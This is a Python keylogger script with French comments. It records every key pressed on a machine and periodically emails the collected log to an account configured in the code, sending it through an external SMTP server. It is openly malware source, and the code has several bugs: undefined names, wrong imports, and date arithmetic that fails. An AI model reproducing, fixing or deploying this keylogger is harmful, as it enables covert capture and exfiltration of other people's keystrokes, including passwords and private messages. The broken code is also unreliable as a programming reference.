import keyboard #pour les keylogs
import smtplib 
#parceque on veut recovoir les keylogs par email
from threading import Timer 
#pour que les methodes s'executent apres une intervalle de temps
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.multipart import MIMEText
########################################################

SEND_REPORT_EVERY= 30 
EMAIL_ADDRESS="email@ohotmail.com" #changer avant d'executer
EMAIL_PASSWORD="password"
## l'envoi d'e-mails depuis des comptes Gmail 
# peut nécessiter des autorisations de sécurité supplémentaires de preference utiliser outlook
#######################################################3

#classe Keylogger
class Keylogger:
    def __init__(self,interval,report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log=""
        self.start_dt=datetime.now()
        self.end_dt=datetime.now()+30

#fonction pour capturer les touches pressées
    def callback(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == kb.Key.space:
                self.log += " "
            else:
                self.log += " "+str(key)+" "
##La méthode callback est appelée chaque 
# fois qu'une touche est pressée, 
# elle ajoute la touche à la variable self.log.



#fonction pour envoyer le rapport par email
    def sendmail(self, email, password, message):
        server = smtplib.SMTP(host='smtp.gmail.com', port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    #fonction pour envoyer le rapport à chaque intervalle de temps
    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.report_method(self.email, self.password, self.log)
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
##La méthode report est appelée toutes les SEND_REPORT_EVERY secondes,
#  elle envoie le rapport par email en appelant la méthode sendmail


 #fonction pour démarrer le keylogger
    def start(self):
        kb_listener = kb.Listener(on_press=self.callback)
        kb_listener.start()
        self.report()
        while True:
            time.sleep(1)

#fonction pour envoyer le rapport par email
def send_email(email, password, message):
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = "Keylogger report"
    msg.attach(MIMEText(message, 'plain'))
    server = smtplib.SMTP(host='smtp.gmail.com', port=587)
    server.starttls()
    server.login(email, password)
    text = msg.as_string()
    server.sendmail(email, email, text)
    server.quit()

#démarrer le keylogger
keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method=send_email)
keylogger.start()